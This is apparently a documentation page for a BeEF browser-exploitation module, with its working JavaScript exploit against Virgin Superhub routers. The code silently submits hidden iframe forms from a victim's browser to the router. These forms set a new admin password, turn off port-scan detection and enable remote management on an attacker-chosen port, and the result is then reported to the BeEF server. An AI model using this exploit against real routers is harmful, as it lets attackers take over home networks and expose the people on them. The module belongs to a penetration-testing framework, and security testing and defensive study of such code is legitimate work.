## Summary

* **Objective**: Enable remote administration, disable the firewall, and change the admin password on a Virgin Superhub router.
* **Authors**: bcoles, n0x00
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/virgin_superhub_csrf)

## Internal Working

Creates iframes with POST requests to enable remote administration, disable the firewall, and change the admin password on a Virgin Superhub router.


```js

var virgin_superhub_iframe1_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "goform/RgSecurity", "POST", "application/x-www-form-urlencoded", [
        {'type':'hidden', 'name':'NetgearPassword',        'value':passwd},
        {'type':'hidden', 'name':'NetgearPasswordReEnter', 'value':passwd},
        {'type':'hidden', 'name':'RestoreFactoryNo',       'value':'0x00'}
]);

var virgin_superhub_iframe2_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "goform/RgServices", "POST", "application/x-www-form-urlencoded", [
        {'type':'hidden', 'name':'cbPortScanDetection',    'value':''}
]);

var virgin_superhub_iframe3_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "goform/RgVMRemoteManagementRes", "POST", "application/x-www-form-urlencoded", [
        {'type':'hidden', 'name':'NetgearVMRmEnable',      'value':'0x01'},
        {'type':'hidden', 'name':'NetgearVMRmPortNumber',  'value':port}
]);

beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");


```

## Feedback

